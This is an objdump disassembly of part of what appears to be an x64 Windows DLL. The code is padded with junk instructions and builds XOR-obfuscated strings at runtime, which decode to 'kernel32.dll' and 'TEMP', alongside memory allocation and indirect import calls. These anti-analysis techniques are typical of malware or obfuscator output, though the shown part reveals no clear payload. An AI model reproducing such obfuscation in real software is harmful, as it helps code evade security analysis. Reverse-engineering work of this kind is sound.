   180001d5f:	5d                   	pop    %rbp
   180001d60:	41 54                	push   %r12
   180001d62:	41 50                	push   %r8
   180001d64:	41 58                	pop    %r8
   180001d66:	41 5c                	pop    %r12
   180001d68:	55                   	push   %rbp
   180001d69:	90                   	nop
   180001d6a:	5d                   	pop    %rbp
   180001d6b:	4d 89 ff             	mov    %r15,%r15
   180001d6e:	4d 87 e4             	xchg   %r12,%r12
   180001d71:	4d 8d 1b             	lea    (%r11),%r11
   180001d74:	52                   	push   %rdx
   180001d75:	55                   	push   %rbp
   180001d76:	5d                   	pop    %rbp
   180001d77:	5a                   	pop    %rdx
   180001d78:	51                   	push   %rcx
   180001d79:	41 52                	push   %r10
   180001d7b:	41 5a                	pop    %r10
   180001d7d:	59                   	pop    %rcx
   180001d7e:	c7 44 24 04 8d 02 00 	movl   $0x28d,0x4(%rsp)
   180001d85:	00 
   180001d86:	58                   	pop    %rax
   180001d87:	c3                   	ret
   180001d88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001d8f:	00 
   180001d90:	48 81 ec 38 02 00 00 	sub    $0x238,%rsp
   180001d97:	b9 ad 02 00 00       	mov    $0x2ad,%ecx
   180001d9c:	e8 cf 00 00 00       	call   0x180001e70
   180001da1:	48 8d 36             	lea    (%rsi),%rsi
   180001da4:	4d 8d 09             	lea    (%r9),%r9
   180001da7:	4d 8d 24 24          	lea    (%r12),%r12
   180001dab:	48 89 e4             	mov    %rsp,%rsp
   180001dae:	e8 dd 00 00 00       	call   0x180001e90
   180001db3:	c7 44 24 30 40 00 00 	movl   $0x40,0x30(%rsp)
   180001dba:	00 
   180001dbb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180001dc0:	ff 15 2a 25 02 00    	call   *0x2252a(%rip)        # 0x1800242f0
   180001dc6:	48 8d 1b             	lea    (%rbx),%rbx
   180001dc9:	48 87 f6             	xchg   %rsi,%rsi
   180001dcc:	4d 87 c0             	xchg   %r8,%r8
   180001dcf:	48 8d 09             	lea    (%rcx),%rcx
   180001dd2:	48 87 e4             	xchg   %rsp,%rsp
   180001dd5:	48 87 ff             	xchg   %rdi,%rdi
   180001dd8:	4d 89 ed             	mov    %r13,%r13
   180001ddb:	ff 15 ff 24 02 00    	call   *0x224ff(%rip)        # 0x1800242e0
   180001de1:	51                   	push   %rcx
   180001de2:	53                   	push   %rbx
   180001de3:	5b                   	pop    %rbx
   180001de4:	59                   	pop    %rcx
   180001de5:	e8 56 fb ff ff       	call   0x180001940
   180001dea:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180001def:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001df4:	ff 15 be 24 02 00    	call   *0x224be(%rip)        # 0x1800242b8
   180001dfa:	41 56                	push   %r14
   180001dfc:	90                   	nop
   180001dfd:	41 5e                	pop    %r14
   180001dff:	41 50                	push   %r8
   180001e01:	41 58                	pop    %r8
   180001e03:	31 c9                	xor    %ecx,%ecx
   180001e05:	ff 15 bd 25 02 00    	call   *0x225bd(%rip)        # 0x1800243c8
   180001e0b:	90                   	nop
   180001e0c:	48 87 d2             	xchg   %rdx,%rdx
   180001e0f:	90                   	nop
   180001e10:	90                   	nop
   180001e11:	48 87 e4             	xchg   %rsp,%rsp
   180001e14:	90                   	nop
   180001e15:	c7 44 24 30 75 16 23 	movl   $0x231675,0x30(%rsp)
   180001e1c:	00 
   180001e1d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180001e21:	4d 89 ed             	mov    %r13,%r13
   180001e24:	48 87 ff             	xchg   %rdi,%rdi
   180001e27:	90                   	nop
   180001e28:	e8 a3 00 00 00       	call   0x180001ed0
   180001e2d:	4d 89 c0             	mov    %r8,%r8
   180001e30:	90                   	nop
   180001e31:	90                   	nop
   180001e32:	90                   	nop
   180001e33:	4d 8d 36             	lea    (%r14),%r14
   180001e36:	4d 8d 1b             	lea    (%r11),%r11
   180001e39:	4d 87 db             	xchg   %r11,%r11
   180001e3c:	90                   	nop
   180001e3d:	90                   	nop
   180001e3e:	c7 44 24 2c 2e 00 00 	movl   $0x2e,0x2c(%rsp)
   180001e45:	00 
   180001e46:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   180001e4b:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180001e50:	ba 04 01 00 00       	mov    $0x104,%edx
   180001e55:	45 31 c9             	xor    %r9d,%r9d
   180001e58:	ff 15 c2 23 02 00    	call   *0x223c2(%rip)        # 0x180024220
   180001e5e:	90                   	nop
   180001e5f:	48 81 c4 38 02 00 00 	add    $0x238,%rsp
   180001e66:	c3                   	ret
   180001e67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180001e6e:	00 00 
   180001e70:	48 83 ec 28          	sub    $0x28,%rsp
   180001e74:	ff 15 66 25 02 00    	call   *0x22566(%rip)        # 0x1800243e0
   180001e7a:	90                   	nop
   180001e7b:	4d 87 ed             	xchg   %r13,%r13
   180001e7e:	90                   	nop
   180001e7f:	48 8d 1b             	lea    (%rbx),%rbx
   180001e82:	90                   	nop
   180001e83:	48 83 c4 28          	add    $0x28,%rsp
   180001e87:	c3                   	ret
   180001e88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001e8f:	00 
   180001e90:	50                   	push   %rax
   180001e91:	41 52                	push   %r10
   180001e93:	41 5a                	pop    %r10
   180001e95:	90                   	nop
   180001e96:	4d 89 d2             	mov    %r10,%r10
   180001e99:	4d 89 ff             	mov    %r15,%r15
   180001e9c:	90                   	nop
   180001e9d:	48 87 e4             	xchg   %rsp,%rsp
   180001ea0:	90                   	nop
   180001ea1:	4d 89 c0             	mov    %r8,%r8
   180001ea4:	4d 89 d2             	mov    %r10,%r10
   180001ea7:	48 89 db             	mov    %rbx,%rbx
   180001eaa:	4d 89 f6             	mov    %r14,%r14
   180001ead:	4d 8d 00             	lea    (%r8),%r8
   180001eb0:	48 89 e4             	mov    %rsp,%rsp
   180001eb3:	48 89 c9             	mov    %rcx,%rcx
   180001eb6:	52                   	push   %rdx
   180001eb7:	41 57                	push   %r15
   180001eb9:	41 5f                	pop    %r15
   180001ebb:	5a                   	pop    %rdx
   180001ebc:	c7 44 24 04 58 02 00 	movl   $0x258,0x4(%rsp)
   180001ec3:	00 
   180001ec4:	58                   	pop    %rax
   180001ec5:	c3                   	ret
   180001ec6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   180001ecd:	00 00 00 
   180001ed0:	50                   	push   %rax
   180001ed1:	4d 87 d2             	xchg   %r10,%r10
   180001ed4:	4d 87 ed             	xchg   %r13,%r13
   180001ed7:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001edb:	53                   	push   %rbx
   180001edc:	48 89 c9             	mov    %rcx,%rcx
   180001edf:	4d 8d 1b             	lea    (%r11),%r11
   180001ee2:	5b                   	pop    %rbx
   180001ee3:	48 8d 12             	lea    (%rdx),%rdx
   180001ee6:	90                   	nop
   180001ee7:	90                   	nop
   180001ee8:	41 57                	push   %r15
   180001eea:	41 5f                	pop    %r15
   180001eec:	48 89 ed             	mov    %rbp,%rbp
   180001eef:	4d 87 d2             	xchg   %r10,%r10
   180001ef2:	c7 44 24 04 be 01 00 	movl   $0x1be,0x4(%rsp)
   180001ef9:	00 
   180001efa:	58                   	pop    %rax
   180001efb:	c3                   	ret
   180001efc:	0f 1f 40 00          	nopl   0x0(%rax)
   180001f00:	48 81 ec 38 02 00 00 	sub    $0x238,%rsp
   180001f07:	b9 0e 01 00 00       	mov    $0x10e,%ecx
   180001f0c:	e8 3f 01 00 00       	call   0x180002050
   180001f11:	b9 06 00 00 00       	mov    $0x6,%ecx
   180001f16:	ff 15 1c 24 02 00    	call   *0x2241c(%rip)        # 0x180024338
   180001f1c:	55                   	push   %rbp
   180001f1d:	48 87 db             	xchg   %rbx,%rbx
   180001f20:	5d                   	pop    %rbp
   180001f21:	ff 15 b9 22 02 00    	call   *0x222b9(%rip)        # 0x1800241e0
   180001f27:	41 53                	push   %r11
   180001f29:	50                   	push   %rax
   180001f2a:	58                   	pop    %rax
   180001f2b:	41 5b                	pop    %r11
   180001f2d:	90                   	nop
   180001f2e:	48 87 db             	xchg   %rbx,%rbx
   180001f31:	90                   	nop
   180001f32:	48 87 db             	xchg   %rbx,%rbx
   180001f35:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001f39:	48 89 d2             	mov    %rdx,%rdx
   180001f3c:	4d 8d 00             	lea    (%r8),%r8
   180001f3f:	48 8d 0d 6e eb 01 00 	lea    0x1eb6e(%rip),%rcx        # 0x180020ab4
   180001f46:	ff 15 2c 24 02 00    	call   *0x2242c(%rip)        # 0x180024378
   180001f4c:	4d 89 ed             	mov    %r13,%r13
   180001f4f:	4d 8d 00             	lea    (%r8),%r8
   180001f52:	4d 89 d2             	mov    %r10,%r10
   180001f55:	c7 44 24 30 ff e1 ab 	movl   $0xabe1ff,0x30(%rsp)
   180001f5c:	00 
   180001f5d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180001f61:	41 51                	push   %r9
   180001f63:	41 59                	pop    %r9
   180001f65:	e8 96 f9 ff ff       	call   0x180001900
   180001f6a:	41 55                	push   %r13
   180001f6c:	4d 89 e4             	mov    %r12,%r12
   180001f6f:	41 5d                	pop    %r13
   180001f71:	48 87 f6             	xchg   %rsi,%rsi
   180001f74:	b9 70 02 00 00       	mov    $0x270,%ecx
   180001f79:	e8 f2 00 00 00       	call   0x180002070
   180001f7e:	41 57                	push   %r15
   180001f80:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001f84:	41 5f                	pop    %r15
   180001f86:	53                   	push   %rbx
   180001f87:	4d 87 e4             	xchg   %r12,%r12
   180001f8a:	5b                   	pop    %rbx
   180001f8b:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   180001f90:	ff 15 fa 22 02 00    	call   *0x222fa(%rip)        # 0x180024290
   180001f96:	e8 65 f8 ff ff       	call   0x180001800
   180001f9b:	c7 44 24 20 87 00 00 	movl   $0x87,0x20(%rsp)
   180001fa2:	00 
   180001fa3:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001fa7:	35 d3 00 00 00       	xor    $0xd3,%eax
   180001fac:	66 89 44 24 26       	mov    %ax,0x26(%rsp)
   180001fb1:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001fb5:	35 c2 00 00 00       	xor    $0xc2,%eax
   180001fba:	66 89 44 24 28       	mov    %ax,0x28(%rsp)
   180001fbf:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001fc3:	35 ca 00 00 00       	xor    $0xca,%eax
   180001fc8:	66 89 44 24 2a       	mov    %ax,0x2a(%rsp)
   180001fcd:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001fd1:	35 d7 00 00 00       	xor    $0xd7,%eax
   180001fd6:	66 89 44 24 2c       	mov    %ax,0x2c(%rsp)
   180001fdb:	66 c7 44 24 2e 00 00 	movw   $0x0,0x2e(%rsp)
   180001fe2:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   180001fe7:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180001fec:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001ff2:	ff 15 10 22 02 00    	call   *0x22210(%rip)        # 0x180024208
   180001ff8:	48 89 c0             	mov    %rax,%rax
   180001ffb:	4d 89 ed             	mov    %r13,%r13
   180001ffe:	90                   	nop
   180001fff:	4d 87 c9             	xchg   %r9,%r9
   180002002:	90                   	nop
   180002003:	90                   	nop
   180002004:	ff 15 e6 21 02 00    	call   *0x221e6(%rip)        # 0x1800241f0
   18000200a:	52                   	push   %rdx
   18000200b:	4d 8d 24 24          	lea    (%r12),%r12
   18000200f:	5a                   	pop    %rdx
   180002010:	c7 44 24 30 8d e1 60 	movl   $0x60e18d,0x30(%rsp)
   180002017:	00 
   180002018:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000201c:	41 53                	push   %r11
   18000201e:	41 5b                	pop    %r11
   180002020:	90                   	nop
   180002021:	4d 89 ed             	mov    %r13,%r13
   180002024:	4d 87 db             	xchg   %r11,%r11
   180002027:	90                   	nop
   180002028:	4d 87 c9             	xchg   %r9,%r9
   18000202b:	90                   	nop
   18000202c:	4d 87 ff             	xchg   %r15,%r15
   18000202f:	48 89 c9             	mov    %rcx,%rcx
   180002032:	90                   	nop
   180002033:	53                   	push   %rbx
   180002034:	41 54                	push   %r12
   180002036:	41 5c                	pop    %r12
   180002038:	5b                   	pop    %rbx
   180002039:	31 c0                	xor    %eax,%eax
   18000203b:	48 81 c4 38 02 00 00 	add    $0x238,%rsp
   180002042:	c3                   	ret
   180002043:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000204a:	84 00 00 00 00 00 
   180002050:	48 83 ec 28          	sub    $0x28,%rsp
   180002054:	31 d2                	xor    %edx,%edx
   180002056:	ff 15 8c 23 02 00    	call   *0x2238c(%rip)        # 0x1800243e8
   18000205c:	90                   	nop
   18000205d:	4d 8d 09             	lea    (%r9),%r9
   180002060:	90                   	nop
   180002061:	90                   	nop
   180002062:	90                   	nop
   180002063:	48 83 c4 28          	add    $0x28,%rsp
   180002067:	c3                   	ret
   180002068:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000206f:	00 
   180002070:	56                   	push   %rsi
   180002071:	48 83 ec 20          	sub    $0x20,%rsp
   180002075:	89 ce                	mov    %ecx,%esi
   180002077:	ff 15 4b 22 02 00    	call   *0x2224b(%rip)        # 0x1800242c8
   18000207d:	83 e0 3f             	and    $0x3f,%eax
   180002080:	01 c6                	add    %eax,%esi
   180002082:	89 f1                	mov    %esi,%ecx
   180002084:	ff 15 56 23 02 00    	call   *0x22356(%rip)        # 0x1800243e0
   18000208a:	41 54                	push   %r12
   18000208c:	51                   	push   %rcx
   18000208d:	59                   	pop    %rcx
   18000208e:	41 5c                	pop    %r12
   180002090:	90                   	nop
   180002091:	48 83 c4 20          	add    $0x20,%rsp
   180002095:	5e                   	pop    %rsi
   180002096:	c3                   	ret
   180002097:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000209e:	00 00 
   1800020a0:	56                   	push   %rsi
   1800020a1:	57                   	push   %rdi
   1800020a2:	48 83 ec 68          	sub    $0x68,%rsp
   1800020a6:	b9 6d 02 00 00       	mov    $0x26d,%ecx
   1800020ab:	e8 10 02 00 00       	call   0x1800022c0
   1800020b0:	90                   	nop
   1800020b1:	48 8d 3f             	lea    (%rdi),%rdi
   1800020b4:	41 52                	push   %r10
   1800020b6:	41 56                	push   %r14
   1800020b8:	41 5e                	pop    %r14
   1800020ba:	41 5a                	pop    %r10
   1800020bc:	48 8d 05 f7 e9 01 00 	lea    0x1e9f7(%rip),%rax        # 0x180020aba
   1800020c3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800020c8:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1800020cf:	00 
   1800020d0:	4c 8d 05 e7 e9 01 00 	lea    0x1e9e7(%rip),%r8        # 0x180020abe
   1800020d7:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   1800020dc:	31 d2                	xor    %edx,%edx
   1800020de:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800020e4:	ff 15 26 20 02 00    	call   *0x22026(%rip)        # 0x180024110
   1800020ea:	48 87 d2             	xchg   %rdx,%rdx
   1800020ed:	4d 87 d2             	xchg   %r10,%r10
   1800020f0:	4d 89 f6             	mov    %r14,%r14
   1800020f3:	48 89 c0             	mov    %rax,%rax
   1800020f6:	48 8b 35 43 22 02 00 	mov    0x22243(%rip),%rsi        # 0x180024340
   1800020fd:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   180002102:	ff d6                	call   *%rsi
   180002104:	4d 87 ed             	xchg   %r13,%r13
   180002107:	90                   	nop
   180002108:	57                   	push   %rdi
   180002109:	4d 89 ed             	mov    %r13,%r13
   18000210c:	5f                   	pop    %rdi
   18000210d:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180002112:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002117:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   18000211e:	00 
   18000211f:	4c 8d 05 76 e9 01 00 	lea    0x1e976(%rip),%r8        # 0x180020a9c
   180002126:	31 c9                	xor    %ecx,%ecx
   180002128:	31 d2                	xor    %edx,%edx
   18000212a:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180002130:	ff 15 3a 22 02 00    	call   *0x2223a(%rip)        # 0x180024370
   180002136:	52                   	push   %rdx
   180002137:	4d 87 ed             	xchg   %r13,%r13
   18000213a:	5a                   	pop    %rdx
   18000213b:	48 89 ed             	mov    %rbp,%rbp
   18000213e:	c7 44 24 3c 2b 00 00 	movl   $0x2b,0x3c(%rsp)
   180002145:	00 
   180002146:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000214a:	83 f0 40             	xor    $0x40,%eax
   18000214d:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180002152:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180002156:	83 f0 4e             	xor    $0x4e,%eax
   180002159:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   18000215e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180002162:	83 f0 59             	xor    $0x59,%eax
   180002165:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   18000216a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000216e:	83 f0 45             	xor    $0x45,%eax
   180002171:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180002176:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000217a:	83 f0 4e             	xor    $0x4e,%eax
   18000217d:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   180002182:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180002186:	83 f0 47             	xor    $0x47,%eax
   180002189:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   18000218e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180002192:	83 f0 18             	xor    $0x18,%eax
   180002195:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   18000219a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000219e:	83 f0 19             	xor    $0x19,%eax
   1800021a1:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   1800021a6:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800021aa:	83 f0 05             	xor    $0x5,%eax
   1800021ad:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   1800021b2:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800021b6:	83 f0 4f             	xor    $0x4f,%eax
   1800021b9:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   1800021be:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800021c2:	83 f0 47             	xor    $0x47,%eax
   1800021c5:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   1800021ca:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800021ce:	83 f0 47             	xor    $0x47,%eax
   1800021d1:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   1800021d6:	66 c7 44 24 58 00 00 	movw   $0x0,0x58(%rsp)
   1800021dd:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800021e2:	ff 15 78 20 02 00    	call   *0x22078(%rip)        # 0x180024260
   1800021e8:	56                   	push   %rsi
   1800021e9:	4d 87 d2             	xchg   %r10,%r10
   1800021ec:	4d 87 e4             	xchg   %r12,%r12
   1800021ef:	5e                   	pop    %rsi
   1800021f0:	c7 44 24 40 ff 22 cc 	movl   $0xcc22ff,0x40(%rsp)
   1800021f7:	00 
   1800021f8:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800021fc:	4d 87 ed             	xchg   %r13,%r13
   1800021ff:	48 87 d2             	xchg   %rdx,%rdx
   180002202:	4d 87 e4             	xchg   %r12,%r12
   180002205:	4d 8d 1b             	lea    (%r11),%r11
   180002208:	e8 73 f1 ff ff       	call   0x180001380
   18000220d:	56                   	push   %rsi
   18000220e:	4d 8d 12             	lea    (%r10),%r10
   180002211:	4d 89 f6             	mov    %r14,%r14
   180002214:	5e                   	pop    %rsi
   180002215:	4d 89 e4             	mov    %r12,%r12
   180002218:	48 8d 36             	lea    (%rsi),%rsi
   18000221b:	4d 8d 00             	lea    (%r8),%r8
   18000221e:	4d 87 e4             	xchg   %r12,%r12
   180002221:	e8 9a fa ff ff       	call   0x180001cc0
   180002226:	b9 34 02 00 00       	mov    $0x234,%ecx
   18000222b:	e8 e0 00 00 00       	call   0x180002310
   180002230:	90                   	nop
   180002231:	4d 89 c9             	mov    %r9,%r9
   180002234:	48 89 c0             	mov    %rax,%rax
   180002237:	4d 87 ff             	xchg   %r15,%r15
   18000223a:	48 8b 3d 4f 20 02 00 	mov    0x2204f(%rip),%rdi        # 0x180024290
   180002241:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180002246:	ff d7                	call   *%rdi
   180002248:	e8 83 fc ff ff       	call   0x180001ed0
   18000224d:	ff 15 65 1f 02 00    	call   *0x21f65(%rip)        # 0x1800241b8
   180002253:	ff 15 6f 20 02 00    	call   *0x2206f(%rip)        # 0x1800242c8
   180002259:	57                   	push   %rdi
   18000225a:	4d 87 ed             	xchg   %r13,%r13
   18000225d:	5f                   	pop    %rdi
   18000225e:	90                   	nop
   18000225f:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002263:	90                   	nop
   180002264:	90                   	nop
   180002265:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000226a:	ff d7                	call   *%rdi
   18000226c:	48 89 c1             	mov    %rax,%rcx
   18000226f:	ff 15 a3 1f 02 00    	call   *0x21fa3(%rip)        # 0x180024218
   180002275:	4d 8d 3f             	lea    (%r15),%r15
   180002278:	90                   	nop
   180002279:	4d 87 c0             	xchg   %r8,%r8
   18000227c:	48 89 f6             	mov    %rsi,%rsi
   18000227f:	48 89 c0             	mov    %rax,%rax
   180002282:	c7 44 24 40 3f f5 d4 	movl   $0xd4f53f,0x40(%rsp)
   180002289:	00 
   18000228a:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000228e:	41 51                	push   %r9
   180002290:	48 87 e4             	xchg   %rsp,%rsp
   180002293:	4d 87 c0             	xchg   %r8,%r8
   180002296:	41 59                	pop    %r9
   180002298:	4d 89 f6             	mov    %r14,%r14
   18000229b:	4d 8d 1b             	lea    (%r11),%r11
   18000229e:	41 56                	push   %r14
   1800022a0:	48 87 ff             	xchg   %rdi,%rdi
   1800022a3:	41 5e                	pop    %r14
   1800022a5:	4d 8d 1b             	lea    (%r11),%r11
   1800022a8:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1800022ad:	ff d6                	call   *%rsi
   1800022af:	90                   	nop
   1800022b0:	48 83 c4 68          	add    $0x68,%rsp
   1800022b4:	5f                   	pop    %rdi
   1800022b5:	5e                   	pop    %rsi
   1800022b6:	c3                   	ret
   1800022b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800022be:	00 00 
   1800022c0:	56                   	push   %rsi
   1800022c1:	57                   	push   %rdi
   1800022c2:	48 83 ec 28          	sub    $0x28,%rsp
   1800022c6:	89 ce                	mov    %ecx,%esi
   1800022c8:	31 c9                	xor    %ecx,%ecx
   1800022ca:	ba 01 00 00 00       	mov    $0x1,%edx
   1800022cf:	45 31 c0             	xor    %r8d,%r8d
   1800022d2:	45 31 c9             	xor    %r9d,%r9d
   1800022d5:	ff 15 3d 1e 02 00    	call   *0x21e3d(%rip)        # 0x180024118
   1800022db:	48 85 c0             	test   %rax,%rax
   1800022de:	74 17                	je     0x1800022f7
   1800022e0:	48 89 c7             	mov    %rax,%rdi
   1800022e3:	48 89 c1             	mov    %rax,%rcx
   1800022e6:	89 f2                	mov    %esi,%edx
   1800022e8:	ff 15 32 21 02 00    	call   *0x22132(%rip)        # 0x180024420
   1800022ee:	48 89 f9             	mov    %rdi,%rcx
   1800022f1:	ff 15 11 1e 02 00    	call   *0x21e11(%rip)        # 0x180024108
   1800022f7:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800022fb:	48 8d 12             	lea    (%rdx),%rdx
   1800022fe:	4d 8d 3f             	lea    (%r15),%r15
   180002301:	90                   	nop
   180002302:	48 83 c4 28          	add    $0x28,%rsp
   180002306:	5f                   	pop    %rdi
   180002307:	5e                   	pop    %rsi
   180002308:	c3                   	ret
   180002309:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002310:	56                   	push   %rsi
   180002311:	57                   	push   %rdi
   180002312:	48 83 ec 28          	sub    $0x28,%rsp
   180002316:	89 ce                	mov    %ecx,%esi
   180002318:	31 c9                	xor    %ecx,%ecx
   18000231a:	ba 01 00 00 00       	mov    $0x1,%edx
   18000231f:	45 31 c0             	xor    %r8d,%r8d
   180002322:	45 31 c9             	xor    %r9d,%r9d
   180002325:	ff 15 ed 1d 02 00    	call   *0x21ded(%rip)        # 0x180024118
   18000232b:	48 85 c0             	test   %rax,%rax
   18000232e:	74 1e                	je     0x18000234e
   180002330:	48 89 c7             	mov    %rax,%rdi
   180002333:	48 89 c1             	mov    %rax,%rcx
   180002336:	89 f2                	mov    %esi,%edx
   180002338:	ff 15 e2 20 02 00    	call   *0x220e2(%rip)        # 0x180024420
   18000233e:	48 89 f9             	mov    %rdi,%rcx
   180002341:	48 83 c4 28          	add    $0x28,%rsp
   180002345:	5f                   	pop    %rdi
   180002346:	5e                   	pop    %rsi
   180002347:	48 ff 25 ba 1d 02 00 	rex.W jmp *0x21dba(%rip)        # 0x180024108
   18000234e:	90                   	nop
   18000234f:	48 83 c4 28          	add    $0x28,%rsp
   180002353:	5f                   	pop    %rdi
   180002354:	5e                   	pop    %rsi
   180002355:	c3                   	ret
   180002356:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   18000235d:	00 00 00 
   180002360:	48 83 ec 38          	sub    $0x38,%rsp
   180002364:	c7 44 24 2c 09 00 00 	movl   $0x9,0x2c(%rsp)
   18000236b:	00 
   18000236c:	41 55                	push   %r13
   18000236e:	90                   	nop
   18000236f:	41 5d                	pop    %r13
   180002371:	e8 ca f2 ff ff       	call   0x180001640
   180002376:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000237a:	51                   	push   %rcx
   18000237b:	56                   	push   %rsi
   18000237c:	5e                   	pop    %rsi
   18000237d:	59                   	pop    %rcx
   18000237e:	b9 b1 01 00 00       	mov    $0x1b1,%ecx
   180002383:	e8 a8 00 00 00       	call   0x180002430
   180002388:	90                   	nop
   180002389:	48 89 d2             	mov    %rdx,%rdx
   18000238c:	e8 2f f9 ff ff       	call   0x180001cc0
   180002391:	ba 00 10 00 00       	mov    $0x1000,%edx
   180002396:	31 c9                	xor    %ecx,%ecx
   180002398:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   18000239e:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1800023a4:	ff 15 5e 20 02 00    	call   *0x2205e(%rip)        # 0x180024408
   1800023aa:	48 85 c0             	test   %rax,%rax
   1800023ad:	74 11                	je     0x1800023c0
   1800023af:	48 89 c1             	mov    %rax,%rcx
   1800023b2:	31 d2                	xor    %edx,%edx
   1800023b4:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   1800023ba:	ff 15 50 20 02 00    	call   *0x22050(%rip)        # 0x180024410
   1800023c0:	48 8d 09             	lea    (%rcx),%rcx
   1800023c3:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800023c7:	ff 15 33 1e 02 00    	call   *0x21e33(%rip)        # 0x180024200
   1800023cd:	48 85 c0             	test   %rax,%rax
   1800023d0:	74 09                	je     0x1800023db
   1800023d2:	48 89 c1             	mov    %rax,%rcx
   1800023d5:	ff 15 b5 1d 02 00    	call   *0x21db5(%rip)        # 0x180024190
   1800023db:	48 87 db             	xchg   %rbx,%rbx
   1800023de:	4d 87 e4             	xchg   %r12,%r12
   1800023e1:	48 8d 12             	lea    (%rdx),%rdx
   1800023e4:	48 87 f6             	xchg   %rsi,%rsi
   1800023e7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800023ec:	ff 15 96 1f 02 00    	call   *0x21f96(%rip)        # 0x180024388
   1800023f2:	ff 15 f0 1d 02 00    	call   *0x21df0(%rip)        # 0x1800241e8
   1800023f8:	48 89 c1             	mov    %rax,%rcx
   1800023fb:	ff 15 bf 1e 02 00    	call   *0x21ebf(%rip)        # 0x1800242c0
   180002401:	41 53                	push   %r11
   180002403:	41 5b                	pop    %r11
   180002405:	c7 44 24 30 c0 38 64 	movl   $0x6438c0,0x30(%rsp)
   18000240c:	00 
   18000240d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002411:	90                   	nop
   180002412:	90                   	nop
   180002413:	41 50                	push   %r8
   180002415:	4d 87 c0             	xchg   %r8,%r8
   180002418:	41 58                	pop    %r8
   18000241a:	41 53                	push   %r11
   18000241c:	4d 87 ed             	xchg   %r13,%r13
   18000241f:	4d 89 e4             	mov    %r12,%r12
   180002422:	41 5b                	pop    %r11
   180002424:	31 c0                	xor    %eax,%eax
   180002426:	48 83 c4 38          	add    $0x38,%rsp
   18000242a:	c3                   	ret
   18000242b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002430:	41 56                	push   %r14
   180002432:	56                   	push   %rsi
   180002433:	57                   	push   %rdi
   180002434:	53                   	push   %rbx
   180002435:	48 83 ec 28          	sub    $0x28,%rsp
   180002439:	89 ce                	mov    %ecx,%esi
